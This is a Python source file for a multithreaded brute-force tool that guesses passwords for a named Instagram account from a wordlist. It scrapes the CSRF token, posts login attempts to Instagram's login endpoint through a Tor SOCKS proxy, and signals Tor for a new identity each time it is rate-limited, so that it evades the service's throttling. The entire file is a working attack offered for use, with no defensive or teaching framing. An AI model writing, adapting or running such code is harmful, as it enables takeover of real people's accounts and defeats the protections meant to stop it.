import requests
import threading
from time import sleep
from sys import exit as sysexit, stderr

class Bruter(threading.Thread):

    # public constants
    ERR_HOMEPAGE_FETCH_FAILED = 0
    ERR_HTTP_CODE_NOT_OK = 1
    ERR_TOKEN_NOT_FOUND = 2
    ERR_CONNECTION_FAILED = 3
    ERR_INVALID_RESPONSE = 4
    ERR_TOO_MANY_REQUESTS = 5

    def __init__(self, username, passlist_file, config, on_success_callback, on_error_callback, thread_number):
        threading.Thread.__init__(self, name = 'Bruter%s' % thread_number)

        # private constants
        self.__INSTA_HOME_URL = 'https://www.instagram.com'
        self.__INSTA_API_URL = 'https://www.instagram.com/accounts/login/ajax/'
        self.__TOKEN_COOKIE_NAME = 'csrftoken'
        self.__TOKEN_HEADER_NAME = 'X-CSRFToken'
        self.__TIMEOUT = 3 # in seconds

        # thread lock
        self.__lock = threading.Lock()
        
        self.__passlist_file = passlist_file

        self.__on_success = on_success_callback # on_success(found, password)
        self.__on_error = on_error_callback # on_error(error_code)

        # self.__queue = password_queue
        self.__username = username
        self.__running = True
        # self.__notifier = notifier
        
        # parse config:
        self.__tor_control_port = int(config['TorControlPort'])
        self.__tor_control_port_password = config['TorControlPortPassword']
        self.__tor_socks_port = config['TorSocksPort']

    def next_password(self):
        with self.__lock:
            line = self.__passlist_file.readline()
            if line == '':
                return ''
            if line[-1] == '\n':
                line = line[:-1]
            return line
        return ''

    def get_new_tor_identity(self):
        import socket as sock
        connection = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        connection.connect(('127.0.0.1', self.__tor_control_port))
        connection.send(('AUTHENTICATE "%s"\n' % self.__tor_control_port_password).encode())
        # result = connection.recv(3).decode('ascii')
        # print('Getting new tor identity')
        # print(result)
        # if result != '250':
        #     # encountered error, cancel for now
        #     connection.close()
        #     sleep(1)
        #     return
        connection.send(b'signal NEWNYM\n')
        # print(connection.recv(3).decode('ascii'))
        # print('requested new tor identity')
        connection.close()
        sleep(10)

    def auth(self, password):
        # initialize proxy:
        proxy = {
            'http' : 'socks5://localhost:%s' % self.__tor_socks_port,
            'https' : 'socks5://localhost:%s' % self.__tor_socks_port
        }
        while self.__running:
            # first, GET the home page and obtain the token
            try:
                response = requests.get(self.__INSTA_HOME_URL, proxies = proxy, stream = True)
                response.close()
            except requests.exceptions.ConnectionError:
                # try again
                # self.__notifier.notify(msg = 'Could not fetch home page.')
                self.__on_error(Bruter.ERR_HOMEPAGE_FETCH_FAILED)
                continue

            if response.status_code != 200:
                # self.__notifier.notify(msg = 'Received status code %s from server.' % response.status_code)
                self.__on_error(Bruter.ERR_HTTP_CODE_NOT_OK)
                continue
            
            try:
                token = response.cookies[self.__TOKEN_COOKIE_NAME]
            except KeyError:
                # try again
                # self.__notifier.notify(msg = 'Could not find token in cookies.')
                self.__on_error(Bruter.ERR_TOKEN_NOT_FOUND)
                continue
            
            # prepare the datas to send to api url
            data = {
                'username' : self.__username,
                'password' : password
            }

            # prepare the headers to send to api url
            headers = {
                'Referer' : self.__INSTA_HOME_URL,
                'Connection' : 'close',
                self.__TOKEN_HEADER_NAME : token
            }

            try:
                response = requests.post(url = self.__INSTA_API_URL, data = data, headers = headers, proxies = proxy)
            except requests.exceptions.ConnectionError:
                # try again
                # self.__notifier.notify(msg = 'Could not test user/pass.')
                self.__on_error(Bruter.ERR_CONNECTION_FAILED)
                continue

            try:
                response = response.json()
            except ValueError:
                # try again
                # self.__notifier.notify(msg = 'Could not parse response from server: Invalid JSON format.')
                self.__on_error(Bruter.ERR_INVALID_RESPONSE)
                continue
            
            # print(response)

            if 'authenticated' in response:
                self.__on_success(response['authenticated'], password)
                # print(response['authenticated'])
                return response['authenticated']
            else:
                # Should change ip
                # self.__notifier.notify(msg = 'Too many requests. Requesting new Tor identity...')
                self.__on_error(Bruter.ERR_TOO_MANY_REQUESTS)
                self.get_new_tor_identity()
                continue

    def run(self):
        password = self.next_password()
        while not password == '':
            #print('Trying password: %s' % password)
            if self.auth(password = password):
                self.__on_success(True, password)
                break
            password = self.next_password()
        
        # print('Stopping thread')
        return

    def stop(self):
        self.__running = False

class Attacker():
    def __init__(self, username, passlist, thread_count):
        # self.__username = username
        self.__thread_count = thread_count
        self.__username = username

        with open(file = passlist, mode = 'r') as passlist_file:
            self.__passlist_lines_count = sum([1 for line in passlist_file])
        
        self.__total_scanned = 0

        self.__passlist_file = open(file = passlist, mode = 'r')
        
        # parse the config
        with open(file = 'instabruter.conf', mode = 'r') as config_file:
            self.__config = {}
            for line in config_file:
                line = line.split(' ')
                if len(line) != 2:
                    continue
                key, value = line[0], line[1][:-1] # should remove the \n at the end of the line
                self.__config[key] = value
        
        # keeps a list of bruter objects
        self.__bruters = []
        

    def start(self):
        def on_success(is_found, password):
            # For each successful scan (whether the password is found or not), this callback will trigger.
            if is_found:
                self.stop()
                self.block()
                print()
                print('Password: %s' % password)
                sysexit(0)
            else:
                self.__total_scanned += 1
                print('\r ==> Scanning: %s/%s (%s%%)' % (
                    self.__total_scanned,
                    self.__passlist_lines_count,
                    int((self.__total_scanned / self.__passlist_lines_count) * 10000) / 100
                ), end = '')

        def on_error(error_code):
            # If there is any error, this callback will trigger. The `error_code` shows what was the
            # problem. It will contain either Bruter.ERR_HOMEPAGE_FETCH_FAILED, Bruter.ERR_HTTP_CODE_NOT_OK,
            # Bruter.ERR_TOKEN_NOT_FOUND, Bruter.ERR_CONNECTION_FAILED, Bruter.ERR_INVALID_RESPONSE or
            # Bruter.ERR_TOO_MANY_REQUESTS.
            pass
        
        for i in range(self.__thread_count):
            bruter = Bruter(self.__username, self.__passlist_file, self.__config, on_success, on_error, i + 1)
            self.__bruters.append(bruter)
            bruter.start()
            print(' ==> Starting thread: %s/%s\r' % (i + 1, self.__thread_count), end = '')

        print()        
        print(' ==> Starting attack for %s' % self.__username)
    
    def stop(self):
        for bruter in self.__bruters:
            bruter.stop()
    
    def block(self):
        for bruter in self.__bruters:
            bruter.join()
    
    def __del__(self):
        self.stop()